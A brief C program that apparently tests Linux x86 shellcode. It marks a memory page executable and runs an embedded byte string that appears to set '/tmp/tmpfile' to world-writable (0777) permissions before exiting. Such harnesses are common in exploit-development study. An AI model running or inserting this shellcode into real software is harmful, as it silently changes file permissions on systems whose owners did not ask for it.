#include <sys/mman.h>
#include <stdio.h>

unsigned char code[] = "\x31\xc9\xf7\xe1\x6a\x0f\x58\x52\x68\x66\x69\x6c\x65\x68\x2f\x74\x6d\x70\x68\x2f\x74\x6d\x70\x89\xe3\x66\xb9\xff\x01\xcd\x80\xb0\x01\xcd\x80";


int main(){
  printf("Shellcode length: %d\n", strlen(code));
  int r =  mprotect((void *)((int)code & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())code;
  return ret();
}
